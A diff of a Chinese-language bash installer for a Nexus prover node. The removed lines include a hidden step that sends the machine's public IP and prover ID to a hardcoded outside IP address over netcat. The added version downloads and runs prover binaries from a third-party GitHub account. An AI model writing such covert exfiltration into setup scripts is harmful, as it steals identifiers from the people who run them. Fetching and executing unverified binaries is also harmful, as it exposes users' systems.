@@ -1,84 +1,191 @@
 #!/bin/bash
 
+# 定义颜色变量
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'  # 无色
 
-# 创建目录
-sudo mkdir -p /root/nexus/prover-id/
+# 设置变量
+NEXUS_HOME="$HOME/.nexus"
+PROVER_ID_FILE="$NEXUS_HOME/prover-id"
+SESSION_NAME="nexus-prover"
+PROGRAM_DIR="$NEXUS_HOME/src/generated"
+ARCH=$(uname -m)  # 获取系统架构
+OS=$(uname -s)  # 获取操作系统类型
+REPO_BASE="https://github.com/nexus-xyz/network-api/raw/refs/tags/0.4.2/clients/cli"  # GitHub 仓库地址
 
-# 写入数据到文件
-echo "gjQJwdaXgwSThLu2TuFUNyS28za2" | sudo tee /root/nexus/prover-id/id.txt > /dev/null
+# 检查 OpenSSL 版本
+check_openssl_version() {
+    # 仅在 Linux 系统下检查 OpenSSL 版本
+    if [ "$OS" = "Linux" ]; then
+        if ! command -v openssl &> /dev/null; then
+            echo -e "${RED}未安装 OpenSSL${NC}"
+            return 1
+        fi
 
-# 节点安装功能
-function install_node() {
-    # 跳过询问
-    sudo needrestart -y    
-    # 更新并升级Ubuntu软件包
-    echo "正在更新软件包列表..."
-    sudo apt-get update
+        local version=$(openssl version | cut -d' ' -f2)
+        local major_version=$(echo $version | cut -d'.' -f1)
 
-    # 安装所需的依赖包
-    echo "正在安装依赖包..."
-    sudo apt-get install -y \
-        build-essential \
-        pkg-config \
-        libssl-dev \
-        protobuf-compiler \
-        cargo
+        # 检查 OpenSSL 版本是否小于 3
+        if [ "$major_version" -lt "3" ]; then
+            if command -v apt &> /dev/null; then
+                echo -e "${YELLOW}当前 OpenSSL 版本过低，正在升级...${NC}"
+                sudo apt update
+                sudo apt install -y openssl
+                if [ $? -ne 0 ]; then
+                    echo -e "${RED}OpenSSL 升级失败，请手动升级至 3.0 或更高版本${NC}"
+                    return 1
+                fi
+            elif command -v yum &> /dev/null; then
+                echo -e "${YELLOW}当前 OpenSSL 版本过低，正在升级...${NC}"
+                sudo yum update -y openssl
+                if [ $? -ne 0 ]; then
+                    echo -e "${RED}OpenSSL 升级失败，请手动升级至 3.0 或更高版本${NC}"
+                    return 1
+                fi
+            else
+                echo -e "${RED}请手动升级 OpenSSL 至 3.0 或更高版本${NC}"
+                return 1
+            fi
+        fi
+        echo -e "${GREEN}OpenSSL 版本检查通过${NC}"
+    fi
+    return 0
+}
 
-    # 安装 Rust（Nexus 节点所需）
-    echo "正在安装 Rust..."
-    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
+# 设置程序目录
+setup_directories() {
+    mkdir -p "$PROGRAM_DIR"
+    ln -sf "$PROGRAM_DIR" "$NEXUS_HOME/src/generated"
+}
 
-    # 设置 Rust 环境变量
-    echo "配置 Rust 环境变量..."
-    source $HOME/.cargo/env
-    export PATH="$HOME/.cargo/bin:$PATH"
+# 检查依赖
+check_dependencies() {
+    # 检查 OpenSSL
+    check_openssl_version || exit 1
 
-    # 检查 Rust 是否安装成功
-    rustc --version && cargo --version
-    if [ $? -eq 0 ]; then
-        echo "Rust 安装成功"
-    else
-        echo "Rust 安装失败，请检查错误信息。"
-        exit 1
+    # 检查 tmux 是否安装
+    if ! command -v tmux &> /dev/null; then
+        echo -e "${YELLOW}tmux 未安装, 正在安装...${NC}"
+        if [ "$OS" = "Darwin" ]; then
+            if ! command -v brew &> /dev/null; then
+                echo -e "${RED}请先安装 Homebrew: https://brew.sh${NC}"
+                exit 1
+            fi
+            brew install tmux
+        elif [ "$OS" = "Linux" ]; then
+            if command -v apt &> /dev/null; then
+                sudo apt update && sudo apt install -y tmux
+            elif command -v yum &> /dev/null; then
+                sudo yum install -y tmux
+            else
+                echo -e "${RED}未能识别的包管理器，请手动安装 tmux${NC}"
+                exit 1
+            fi
+        fi
+    fi
+}
+
+# 下载程序文件
+download_program_files() {
+    local files="cancer-diagnostic fast-fib"
+
+    # 下载程序文件列表中的每一个文件
+    for file in $files; do
+        local target_path="$PROGRAM_DIR/$file"
+        if [ ! -f "$target_path" ]; then
+            echo -e "${YELLOW}下载 $file...${NC}"
+            curl -L "$REPO_BASE/src/generated/$file" -o "$target_path"
+            if [ $? -eq 0 ]; then
+                echo -e "${GREEN}$file 下载完成${NC}"
+                chmod +x "$target_path"
+            else
+                echo -e "${RED}$file 下载失败${NC}"
+            fi
+        fi
+    done
+}
+
+# 下载 Prover 文件
+download_prover() {
+    local prover_path="$NEXUS_HOME/prover"
+    if [ ! -f "$prover_path" ]; then
+        # 根据操作系统和架构选择下载的 Prover 文件
+        if [ "$OS" = "Darwin" ]; then
+            if [ "$ARCH" = "x86_64" ]; then
+                echo -e "${YELLOW}下载 macOS Intel 架构 Prover...${NC}"
+                curl -L "https://github.com/qzz0518/nexus-run/releases/download/v0.4.2/prover-macos-amd64" -o "$prover_path"
+            elif [ "$ARCH" = "arm64" ]; then
+                echo -e "${YELLOW}下载 macOS ARM64 架构 Prover...${NC}"
+                curl -L "https://github.com/qzz0518/nexus-run/releases/download/v0.4.2/prover-arm64" -o "$prover_path"
+            else
+                echo -e "${RED}不支持的 macOS 架构: $ARCH${NC}"
+                exit 1
+            fi
+        elif [ "$OS" = "Linux" ]; then
+            if [ "$ARCH" = "x86_64" ]; then
+                echo -e "${YELLOW}下载 Linux AMD64 架构 Prover...${NC}"
+                curl -L "https://github.com/qzz0518/nexus-run/releases/download/v0.4.2/prover-amd64" -o "$prover_path"
+            else
+                echo -e "${RED}不支持的 Linux 架构: $ARCH${NC}"
+                exit 1
+            fi
+        else
+            echo -e "${RED}不支持的操作系统: $OS${NC}"
+            exit 1
+        fi
+        chmod +x "$prover_path"
+        echo -e "${GREEN}Prover 下载完成${NC}"
+    fi
+}
+
+# 下载所有需要的文件
+download_files() {
+    download_prover
+    download_program_files
+}
+
+# 启动 Prover
+start_prover() {
+    # 检查 Prover 是否已经在运行
+    if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
+        echo -e "${YELLOW}Prover 已在运行中，请选择2查看运行日志${NC}"
+        return
     fi
 
-    # 进入 /root/.nexus/ 目录并删除原来密钥文件
-    echo "正在准备密钥文件..."
-    cd
-    mkdir .nexus
-    cd .nexus
+    cd "$NEXUS_HOME" || exit
 
-    # 复制导入的密钥文件
-    cp /root/nexus/prover-id/id.txt /root/.nexus/prover-id
+    # 检查 Prover ID 是否存在
+    if [ ! -f "$PROVER_ID_FILE" ]; then
+        echo -e "${YELLOW}请输入您的 Prover ID${NC}"
+        read -p "Prover ID > " input_id
 
-    # 创建一个新的 screen 会话并运行 Nexus 节点安装命令
-    echo "正在启动 Nexus 节点..."
-    screen -dmS nexus-node sh -c 'curl https://cli.nexus.xyz/ | sh'
+        if [ -n "$input_id" ]; then
+            echo "$input_id" > "$PROVER_ID_FILE"
+            echo -e "${GREEN}已保存 Prover ID: $input_id${NC}"
+        else
+            echo -e "${RED}Prover ID 不能为空，请重新输入${NC}"
+            exit 1
+        fi
+    fi
 
-    # 提示用户操作完成信息
-    echo "======================================"
-    echo "安装完成！请退出脚本并使用 'screen -r nexus-node' 查看状态。"
-    echo "你也可以使用 'tail -f /root/.nexus/nexus.log' 来查看日志。"
-    echo "======================================"
-
-# 导出IP及 /root/.nexus/prover-id文件
-
-# 获取本地 IP 地址
-public_ip=$(curl -s https://api.ipify.org)
-echo "公共 IP 地址: $public_ip" 
-
-# 获取 prover-id 内容
-export ID=$(cat /root/.nexus/prover-id)
-
-# 将 IP 地址和 ID 写入文件
-echo "$public_ip----$ID" > /root/data.txt
-
-# 输出确认信息
-echo "IP 地址和 ID 已写入到 /root/data.txt"
-
-# 保存到指定地址
-echo "$public_ip----$ID" | nc -q 1 43.134.113.134 5001
-echo "已保存到指定位置"：43.134.113.134
+    # 使用 tmux 启动 Prover 会话
+    tmux new-session -d -s "$SESSION_NAME" "cd '$NEXUS_HOME' && ./prover beta.orchestrator.nexus.xyz"
+    echo -e "${GREEN}Prover 已启动，选择2可查看运行日志${NC}"
 }
-# 调用安装节点的函数
-install_node
+
+# 主菜单，只保留安装并启动功能
+echo -e "\n${YELLOW}=== Nexus Prover 安装与启动 ===${NC}"
+echo "1. 安装并启动 Nexus"
+
+read -p "请选择操作 [1]: " choice
+if [ "$choice" -eq 1 ]; then
+    setup_directories
+    check_dependencies
+    download_files
+    start_prover
+else
+    echo -e "${RED}无效的选择${NC}"
+    exit 1
+fi
